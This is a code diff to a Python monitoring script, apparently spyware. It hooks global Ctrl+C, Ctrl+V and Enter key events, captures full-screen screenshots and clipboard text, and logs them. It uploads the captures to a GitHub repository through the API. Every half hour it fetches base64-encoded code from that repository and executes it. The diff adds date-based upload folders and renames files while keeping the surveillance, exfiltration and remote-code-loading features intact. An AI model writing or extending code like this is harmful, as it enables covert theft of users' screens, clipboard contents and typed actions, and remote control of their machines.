@@ -1,6 +1,7 @@
 import base64
 import importlib.util
 import os
+import re
 import socket
 import sys
 import threading
@@ -18,12 +19,12 @@ os.makedirs(SAVE_DIR, exist_ok=True)
 GITHUB_CONFIG = {
     "username": "Bei18",
     "repo_name": "my-python-storage",
-    "file_path": "main_logic.py", # 云端脚本文件名
+    "file_path": "main_logic.py",
     "token": "",
 }
 
 uploaded_files = set()
-running_listeners = [] # 用于保存监听器引用以便热替换时关闭
+running_listeners = []
 
 
 def kill_previous_instances():
@@ -53,13 +54,42 @@ def kill_previous_instances():
         pass
 
 
+def extract_date_from_filename(file_name):
+    """
+    智能解析文件名中的日期:
+    1. 匹配 20260823 -> 转化为 8.23
+    2. 匹配 2026-08-23 -> 转化为 8.23
+    3. 解析失败则退回当前时间 (例如 8.25)
+    """
+    # 匹配 YYYYMMDD (例如 20260823)
+    match1 = re.search(r'\b20\d{2}(\d{2})(\d{2})\b', file_name)
+    if match1:
+        month = str(int(match1.group(1)))
+        day = str(int(match1.group(2)))
+        return f"{month}.{day}"
+        
+    # 匹配 YYYY-MM-DD (例如 2026-08-23)
+    match2 = re.search(r'\b20\d{2}-(\d{2})-(\d{2})\b', file_name)
+    if match2:
+        month = str(int(match2.group(1)))
+        day = str(int(match2.group(2)))
+        return f"{month}.{day}"
+        
+    # 如果文件名没有日期，默认使用当前日期
+    return time.strftime('%m.%d').lstrip('0').replace('.0', '.')
+
+
 def upload_file_smart(file_path):
     if not os.path.exists(file_path) or not GITHUB_CONFIG["token"]:
         return False
 
     file_name = os.path.basename(file_path)
     device_folder = DEVICE_NAME
-    date_folder = time.strftime('%m.%d').lstrip('0').replace('.0', '.')
+
+    # 根据文件名自动解析出历史日期或当前日期 (例如 8.23)
+    date_folder = extract_date_from_filename(file_name)
+
+    # 上传路径：uploads/设备名/日期/文件名
     target_path = f"uploads/{device_folder}/{date_folder}/{file_name}"
     
     base_url = f"https://api.github.com/repos/{GITHUB_CONFIG['username']}/{GITHUB_CONFIG['repo_name']}/contents/{target_path}"
@@ -113,6 +143,7 @@ def scheduled_upload_task():
 
 
 def get_log_file_path():
+    # 每天生成独立的 txt 文件，格式为：[设备名]-YYYY-MM-DD-LOG.txt
     today_date = time.strftime("%Y-%m-%d")
     log_filename = f"{DEVICE_NAME}-{today_date}-LOG.txt"
     return os.path.join(SAVE_DIR, log_filename)
@@ -132,8 +163,9 @@ def write_txt(action_type, detail=""):
 
 
 def take_full_screenshot(action_type):
+    # 新截图文件名同样带有 20260825_231121 规则，方便以后提取
     timestamp = time.strftime("%Y%m%d_%H%M%S")
-    filename = f"{DEVICE_NAME}-{timestamp}-{action_type}.png"
+    filename = f"{DEVICE_NAME}_{timestamp}_{action_type}.png"
     filepath = os.path.join(SAVE_DIR, filename)
 
     try:
@@ -163,13 +195,13 @@ def get_clipboard_content():
 
 
 def on_copy():
-    img_file = take_full_screenshot("C")
+    img_file = take_full_screenshot("PASTE_CtrlC")
     clip_text = get_clipboard_content()
     write_txt("C", f"JT: {img_file} | {clip_text}")
 
 
 def on_paste():
-    img_file = take_full_screenshot("V")
+    img_file = take_full_screenshot("PASTE_CtrlV")
     clip_text = get_clipboard_content()
     write_txt("V", f"JT: {img_file} | {clip_text}")
 
@@ -177,7 +209,7 @@ def on_paste():
 def on_press(key):
     try:
         if key == keyboard.Key.enter:
-            img_file = take_full_screenshot("E")
+            img_file = take_full_screenshot("ENTER")
             write_txt("E", f"JT: {img_file}")
     except Exception:
         pass
@@ -193,33 +225,29 @@ def auto_update_loop(token):
     }
     
     while True:
-        time.sleep(1800)  # 每半小时 (1800秒) 执行一次热更新
+        time.sleep(1800)  # 每半小时执行一次
         try:
             res = requests.get(url, headers=headers, timeout=10)
             if res.status_code == 200:
                 content_b64 = res.json().get("content", "")
                 new_code = base64.b64decode(content_b64)
                 
-                # 写入缓存文件
                 with open(cache_path, "wb") as f:
                     f.write(new_code)
                 
                 write_txt("系统", "已完成半小时定时更新云端代码，正在重新载入...")
 
-                # 停止旧的按键监听器
                 for listener in running_listeners:
                     try: listener.stop()
                     except Exception: pass
                 running_listeners.clear()
 
-                # 重新动态加载最新模块并执行 run()
                 spec = importlib.util.spec_from_file_location("remote_main", cache_path)
                 remote_module = importlib.util.module_from_spec(spec)
                 spec.loader.exec_module(remote_module)
                 
-                # 在新线程中重新执行最新的 run
                 threading.Thread(target=remote_module.run, args=(token,), daemon=True).start()
-                break # 当前老的更新循环退出
+                break
         except Exception:
             pass
 
@@ -235,7 +263,7 @@ def run(token):
     upload_thread = threading.Thread(target=scheduled_upload_task, daemon=True)
     upload_thread.start()
 
-    # 3. 启动键盘/剪贴板监听，并记入 listeners 列表
+    # 3. 启动键盘/剪贴板监听
     try:
         hotkey_listener = keyboard.GlobalHotKeys({"<ctrl>+c": on_copy, "<ctrl>+v": on_paste})
         hotkey_listener.start()
@@ -250,7 +278,7 @@ def run(token):
     except Exception as e:
         write_txt("异常", f"按键服务异常: {e}")
 
-    # 4. 启动半小时定时热更新线程
+    # 4. 启动半小时定时热更新
     update_thread = threading.Thread(target=auto_update_loop, args=(token,), daemon=True)
     update_thread.start()
 
